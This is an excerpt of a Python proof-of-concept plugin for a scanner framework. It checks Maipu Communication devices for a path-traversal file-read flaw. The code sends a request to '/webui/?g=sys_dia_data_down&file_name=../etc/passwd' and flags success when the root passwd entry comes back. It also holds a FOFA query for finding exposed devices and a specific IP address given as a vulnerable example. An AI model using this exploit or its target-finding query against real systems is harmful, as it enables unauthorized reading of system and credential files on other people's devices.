...
class POC(POCBase):
    ...
    _info = {
        ...
        title="迈普通信技术股份有限公司"
        """,                     # fofa搜索语句
        "example" : "https://39.155.133.134:443",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }
    ...
    def _verify(self):
        ...
        """
        vuln = [False,""]
        url = self.target + "/webui/?g=sys_dia_data_down&file_name=../etc/passwd" # url自己按需调整
        ...
        try:
            ...
            if req.status_code == 200 and "root::0:0:root:/:/bin/sh" in req.text:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
